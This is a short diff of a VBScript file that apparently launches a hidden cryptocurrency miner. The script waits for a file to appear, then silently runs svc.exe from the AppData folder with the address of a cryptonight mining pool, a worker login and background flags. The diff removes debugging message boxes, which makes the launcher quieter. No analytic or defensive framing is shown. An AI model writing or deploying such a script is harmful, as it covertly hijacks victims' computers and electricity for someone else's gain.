@@ -27,15 +27,12 @@ Do
  
 loop Until FDrtt.FileExists(UMbty)
 
-MsgBox(UMbty)
 
 Set FDrtu = WScript.CreateObject("WScript.Shell")
 trv="FDrtu.Run(FDrtu.ExpandEnvironmentStrings(""%AppData%\svc\"")&""svc.exe -q -o europe.cryptonight-hub.miningpoolhub.com:20580 -u telefile.w -p x --safe --keepalive -B""), 0, false"
 ' trv=trv&""
 ' trv=trv&""
 
-
-' MsgBox(trv)
 
 Execute trv
 
